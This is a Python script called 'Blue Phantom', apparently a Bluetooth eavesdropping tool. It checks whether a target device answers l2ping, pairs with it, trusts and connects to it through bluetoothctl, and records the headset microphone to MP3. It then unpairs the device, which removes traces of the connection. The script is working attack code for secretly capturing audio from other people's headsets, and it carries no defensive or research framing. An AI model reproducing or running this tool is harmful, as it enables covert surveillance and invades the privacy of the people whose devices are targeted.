import argparse
import subprocess
import os
import time
import signal
import sys
import shutil

# Global variable to hold the recorder process (now LAME encoder)
recorder = None

def stop_recording(sig, frame):
    """Handles Ctrl+C (SIGINT) signal to stop the recording process gracefully."""
    print("\n[!] Stopping recording...")
    if recorder:
        # Terminate the LAME encoder and the parecord sub-process (if still running)
        recorder.terminate()
    
    # We exit here, cleanup_connection will be called by the main loop.
    # If the user presses Ctrl+C during recording, the main loop finishes,
    # and cleanup_connection(target) is called just before sys.exit(0)
    # The cleanup will be handled in the main function now.
    sys.exit(0) 

# Register the signal handler
signal.signal(signal.SIGINT, stop_recording)

def check_requirements():
    """Checks if all necessary command-line tools are installed."""
    # Added 'lame' for MP3 encoding
    for tool in ["l2ping", "parecord", "bluetoothctl", "pactl", "lame"]:
        if not shutil.which(tool):
            print(f"[!] Required tool '{tool}' not found. Please install it (e.g., sudo apt install {tool}).")
            sys.exit(1)

def check_vulnerability(mac):
    """Checks if the target MAC address is reachable via l2ping."""
    print(f"[+] Checking if {mac} is reachable (via l2ping)...")
    try:
        # Use a timeout of 2 seconds
        output = subprocess.check_output(["sudo", "l2ping", "-c", "1", "-t", "2", mac], stderr=subprocess.STDOUT)
        if b"1 sent" in output and b"0 received" not in output:
            print(f"[+] Device {mac} is responding. Likely reachable.")
            return True
    except subprocess.CalledProcessError as e:
        print("[-] Device not responding to l2ping.")
        print(f"    Error: {e.output.decode().strip()}")
    except Exception as e:
        print(f"[!] Unexpected error in l2ping: {e}")
    return False

def pair_and_connect(mac):
    """Attempts to pair with, trust, and connect to the device using bluetoothctl."""
    print(f"[+] Attempting to pair and connect to {mac}...")

    commands = f"""
power on
agent on
default-agent
scan off
pair {mac}
trust {mac}
connect {mac}
exit
"""
    # Use a temporary script file
    script_path = "bt_pair.txt"
    with open(script_path, "w") as f:
        f.write(commands)

    try:
        # Run bluetoothctl with the script and capture output to check success
        result = subprocess.run(["bluetoothctl"], 
                                stdin=open(script_path, "r"),
                                capture_output=True, 
                                text=True,
                                timeout=15) # Add timeout for robustness

        if "Connection successful" in result.stdout or "Changing device" in result.stdout:
            print(f"[+] Pairing & connection attempt SUCCESSFUL for {mac}")
            return True
        else:
            print(f"[-] Pairing & connection FAILED. bluetoothctl output suggests failure.")
            # print(result.stdout) # Uncomment for detailed debug
            return False
            
    except subprocess.TimeoutExpired:
        print("[-] bluetoothctl operation timed out.")
        return False
    except Exception as e:
        print(f"[!] Error during bluetoothctl operation: {e}")
        return False
    finally:
        if os.path.exists(script_path):
            os.remove(script_path)

def cleanup_connection(mac):
    """Disconnects and removes (un-trusts/un-pairs) the device."""
    print(f"[*] Cleaning up connection for {mac}...")
    
    commands = f"""
disconnect {mac}
remove {mac}
exit
"""
    script_path = "bt_cleanup.txt"
    with open(script_path, "w") as f:
        f.write(commands)

    try:
        # bluetoothctl se disconnect aur remove (unpair/untrust) kiya
        subprocess.run(["bluetoothctl"], stdin=open(script_path, "r"),
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[+] Device {mac} disconnected and removed.")
    except Exception as e:
        print(f"[!] Error during bluetoothctl cleanup: {e}")
    finally:
        if os.path.exists(script_path):
            os.remove(script_path)

def find_active_bluetooth_source(mac):
    """Searches PulseAudio for the active Bluetooth Headset source."""
    print("[*] Searching for active Bluetooth mic source...")
    mac_id = mac.replace(":", "_").lower()
    
    # The target source name pattern
    target_pattern = f"bluez_source.{mac_id}.headset_head_unit"

    try:
        output = subprocess.check_output(["pactl", "list", "sources", "short"]).decode()
        for line in output.strip().split("\n"):
            if target_pattern in line:
                source_name = line.split()[1]
                print(f"[+] Found active Bluetooth source: {source_name}")
                return source_name
                
        print(f"[!] Bluetooth mic source not found. Make sure device is connected and in HFP/HSP profile.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error while searching for source: {e}")
        sys.exit(1)

def start_recording(mac, source_name):
    """Starts the dual-process recording (parecord | lame) to save as MP3."""
    global recorder
    print("[+] Starting **MP3** audio recording... Press Ctrl+C to stop.")
    os.makedirs("recordings", exist_ok=True)
    
    # Filename for MP3 output
    filename = f"recordings/{mac.replace(':', '_')}_{time.strftime('%Y%m%d_%H%M%S')}.mp3"
    
    print(f"[i] Recording will be saved to: {filename}")
    
    try:
        # 1. Start parecord to pipe raw audio to stdout
        parecord_process = subprocess.Popen(
            [
                "parecord", 
                "--device", source_name, 
                "--rate=16000", # HFP audio is typically 8kHz or 16kHz
                "--format=s16le", 
                "--channels=1", # Mono
                "/" # Output to stdout
            ], 
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL # Suppress error output
        )
        
        # 2. Start LAME to read from stdin and encode to MP3
        # -V3 is a good variable bitrate quality setting
        recorder = subprocess.Popen(
            ["lame", "-V3", "-", filename], 
            stdin=parecord_process.stdout,
            stderr=subprocess.DEVNULL # Suppress error output
        )
        
        # Close the pipe handle in the parent process
        parecord_process.stdout.close() 

        # Wait for the LAME encoder (recorder) to finish (it will only finish 
        # when Ctrl+C is pressed and stop_recording kills it)
        recorder.wait()
        
    except FileNotFoundError:
        print("[!] Fatal Error: 'lame' command not found. Please install LAME for MP3 encoding.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Failed to start recording: {e}")
        sys.exit(1)


def main():
    """Main execution logic."""
    print("""
            _ ____  _   _ ____  ___ ____ _  _ ____ ____ _  _ 
            | |  | | | | |  |  |  | |___ |  | |___ |__| |\/| 
            | |__| |_| |_|  |  |  | |___ |__| |___ |  | |  |
                                 
                 ** Blue Phantom - Bluetooth Audio Recorder **
                                
    """)

    parser = argparse.ArgumentParser(description="blue_phantom.py - Bluetooth HFP/HSP Audio Recorder (MP3 Output)")
    parser.add_argument("-a", "--address", required=True, help="Target Bluetooth MAC Address (e.g., AB:CD:EF:12:34:56)")
    args = parser.parse_args()

    check_requirements()
    target = args.address
    
    # --- Execution Flow ---

    if not check_vulnerability(target):
        print("[-] Target device is not reachable. Exiting.")
        return

    # Attempt pairing and connection
    if not pair_and_connect(target):
        print("[-] Pairing/Connection failed. Cannot proceed. Exiting.")
        return
        
    # Give PulseAudio a moment to register the new source
    time.sleep(3) 

    try:
        source = find_active_bluetooth_source(target)
        start_recording(target, source)
    except SystemExit:
        # If any step calls sys.exit(1) (e.g., source not found, or Ctrl+C)
        pass
    except Exception as e:
        print(f"[!] A critical error occurred: {e}")
    finally:
        # IMPORTANT: Always clean up the connection and un-trust the device
        cleanup_connection(target)

if __name__ == "__main__":
    main()
